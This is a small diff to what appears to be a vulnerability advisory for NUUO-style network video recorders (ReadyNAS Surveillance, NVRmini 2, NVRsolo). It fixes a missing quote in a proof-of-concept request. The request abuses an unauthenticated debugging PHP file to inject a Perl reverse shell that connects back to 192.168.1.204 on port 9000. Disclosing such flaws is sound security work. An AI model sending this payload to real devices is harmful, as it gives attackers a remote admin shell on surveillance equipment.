@@ -56,7 +56,7 @@ function print_file($file_fullpath_name)
 
 The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept:
 - ReadyNAS Surveillance:
-GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,"192.168.1.204%3a9000")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b
+GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,"192.168.1.204%3a9000")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b'
 This will connect a shell back to 192.168.1.204 on port 9000, running as the "admin" user.
 
 - NVRmini 2 and NVRsolo:
